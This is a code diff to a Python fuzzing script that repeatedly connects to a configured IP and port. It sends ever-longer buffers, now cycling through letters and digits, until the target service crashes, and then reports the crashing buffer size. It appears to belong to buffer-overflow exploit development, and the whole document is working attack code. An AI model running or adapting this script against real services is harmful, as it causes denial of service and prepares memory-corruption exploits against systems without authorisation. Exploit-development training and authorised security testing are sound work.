@@ -34,8 +34,10 @@
 import sys
 import socket
 import time
+import random
 from datetime import datetime
-
+from string import ascii_uppercase, ascii_lowercase, digits
+from itertools import chain
 
 ########################## TO CUSTOMIZE ##########################
 step = 100              # increase in number of characters per loop
@@ -88,30 +90,31 @@ if __name__ == '__main__':
     connected = 0
     buffer = ""
     while True:
-        #print("\t[*] Connecting to the target.")
-
-        try:
-            # Connect to the target
-            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect((IP,port))
-            connected = 1 
-            
-            # generate payload
-            buffer = buffer + "A" * step
-            payload = preString + buffer + postString
-            
-            # Send payload
-            print("[*] Sending buffer ({} bytes)".format(len(buffer)))
-            s.sendall(payload.encode())
-            s.close()
-            
-            # pause 1s
-            time.sleep(1)
-            
-
-        except:
-            if connected == 0:
-                print("[X] Connection failed.")
-            else:
-                print("[+] Target crashed (buffer: {} bytes)".format(len(buffer)))
-            break
+        source_chars = chain(ascii_uppercase, ascii_lowercase, digits) # set iterator
+        for c in source_chars:
+            try:
+                # Connect to the target
+                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((IP,port))
+                connected = 1 
+                
+                # generate payload
+                buffer = buffer + c * step
+                payload = preString + buffer + postString
+                
+                # Send payload
+                print("[*] Sending buffer ({} bytes)".format(len(buffer)))
+                s.sendall(payload.encode())
+                #print(payload)
+                s.close()
+                
+                # pause
+                time.sleep(0.5)
+                
+            except Exception as e:
+                #print("[X] Error: {}".format(e.message))
+                if connected == 0:
+                    print("[X] Connection failed.")
+                else:
+                    print("[+] Target crashed (buffer: {} bytes)".format(len(buffer)))
+                sys.exit()
